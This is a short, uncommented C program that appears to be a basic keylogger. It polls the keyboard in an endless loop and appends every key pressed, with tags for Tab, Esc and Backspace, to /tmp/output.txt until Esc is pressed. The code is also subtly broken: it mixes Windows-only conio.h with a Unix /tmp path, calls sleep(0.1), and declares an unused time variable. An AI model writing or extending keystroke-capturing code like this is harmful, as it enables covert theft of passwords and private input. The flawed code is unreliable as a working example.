#include <stdio.h>
#include <time.h>
#include <conio.h>

#define OUTPUT_FILE "/tmp/output.txt"

int main() {
  FILE * file;
  char capture;

  time_t t;
  t = time(NULL);

  file = fopen(OUTPUT_FILE,"a+");

  while (1) {

    sleep(0.1);
    if (kbhit()) {
      capture = getch();

      switch ((int) capture) {
        case ' ':
          fprintf(file, " ");
          break;
        case 0x09:
          fprintf(file,"[TAB]");
          break;
        case 0x0d:
          fprintf(file,"\n");
          break;
        case 0x1b:
          fprintf(file,"[ESC]");
          break;
        case 0x08:
          fprintf(file,"[BACK]");
          break;
        default:
          fputc(capture, file);
      }
      
      if ((int) capture ==  0x1b) {
        fclose(file);
        return 0;
      }
      

    }
  }

  return 0;
}
